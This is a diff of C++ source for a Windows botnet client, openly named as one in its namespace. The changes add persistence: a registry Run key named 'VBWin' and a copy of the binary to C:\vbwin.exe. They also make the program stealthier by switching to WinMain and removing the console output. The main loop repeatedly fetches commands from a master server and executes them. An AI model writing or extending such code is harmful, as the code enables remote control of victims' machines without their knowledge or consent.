@@ -1,3 +1,12 @@
+#if defined(UNICODE) && !defined(_UNICODE)
+    #define _UNICODE
+#elif defined(_UNICODE) && !defined(UNICODE)
+    #define UNICODE
+#endif
+
+#include <tchar.h>
+#include <windows.h>
+
 #include <iostream>
 #include "http_client.h"
 #include "http_request.h"
@@ -6,65 +15,52 @@
 #include "define.h"
 #include "master_conn.h"
 
-#include <Windows.h>
 
 DWORD WINAPI ThreadFunction(LPVOID lpParam) {
-    typedef botnet::http::http_request http_request;
-    typedef botnet::http::http_client http_client;
     typedef botnet::parser parser;
     typedef botnet::master_conn master_conn;
     parser *pcmd;
     master_conn *conn = new master_conn();
 
     for (;;) {
-        
-        std::cout << "ask for command" << '\n';
+
         std::vector<std::string> arr = conn->ask_for_cmd();
-        for (int i = 0; i < arr.size(); i++) {
-            std::cout << ">>>" << arr[i] << '\n';
-        }
 
         pcmd = new parser(arr);
         pcmd->execute();
         delete pcmd;
 
-        Sleep(3000);
+        Sleep(10000);
     }
+    return 0;
 }
 
-int main() {
+void boot() {
+    std::string regstr;
+    regstr = botnet::GetRegistry("VBWin");
+    char appreg[] = "C:\\vbwin.exe";
+    if (regstr.find("vbwin") == std::string::npos) {
+        botnet::SetKeyData(HKEY_LOCAL_MACHINE, "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
+                           REG_SZ, "VBWin", (LPBYTE) appreg, strlen(appreg));
+
+        botnet::copy_it_self("C:", "vbwin.exe");
+    }
+
+}
+
+int WINAPI WinMain (HINSTANCE hThisInstance,
+                     HINSTANCE hPrevInstance,
+                     LPSTR lpszArgument,
+                     int nCmdShow)
+{
     HANDLE  hThreadArray;
     DWORD   dwThread;
 
-    std::wcout << botnet::ReadRegValue(HKEY_LOCAL_MACHINE, "", "VBoxTray") << '\n';
+    boot();
 
     hThreadArray = CreateThread(NULL, 0, ThreadFunction, NULL, 0, &dwThread);
-    std::cout << "Win Lixo" << '\n';
 
     WaitForSingleObject(hThreadArray, INFINITE);
 
-   /* std::string cmds;
-    parser *pcmd;
-
-    std::cout << "Program name: " << botnet::my_name() << '\n';
-
-    http_request *http_req = new http_request(botnet::http::GET);
-    http_request::headers header;
-    std::string host = HOST + ':' + std::to_string(PORT);
-    header.add("Host", host);
-    http_req->setHeaders(header);
-
-    http_client *http_c = new http_client(HOST, PORT);
-    http_c->request(http_req);
-
-	std::cout << http_c->getContent() << '\n';
-    cmds = http_c->getContent();
-    std::size_t found = cmds.find("\r\n\r\n");
-    std::cout << "pos: " << found << '\n';
-    cmds = cmds.substr(found +4);
-    std::cout << "comandos:\n" << cmds;
-    pcmd = new parser(cmds);
-    pcmd->execute();*/
-
-	return 0;
+    return 0;
 }
